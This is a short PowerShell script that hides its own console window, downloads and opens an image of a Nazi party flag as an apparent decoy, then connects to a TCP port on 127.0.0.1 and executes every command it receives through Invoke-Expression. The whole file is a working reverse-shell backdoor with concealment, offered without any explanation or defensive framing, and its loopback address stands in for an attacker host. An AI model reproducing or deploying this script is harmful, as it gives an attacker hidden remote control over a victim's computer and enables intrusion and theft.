Add-Type -Name Window -Namespace Console -MemberDefinition "
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
"
$refPointer = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($refPointer, 0)
Invoke-WebRequest 'https://www.warrelics.eu/forum/attachments/flags-banners-pennants/1072742d1494185570-nsdap-flag-img_0625.jpg' -OutFile "img.jpg"
Invoke-Item img.jpg
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",8916);
$stream = $client.GetStream();
[byte[]]$bytes = 0..255|ForEach-Object{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    Invoke-Expression $data;
};
$client.Close()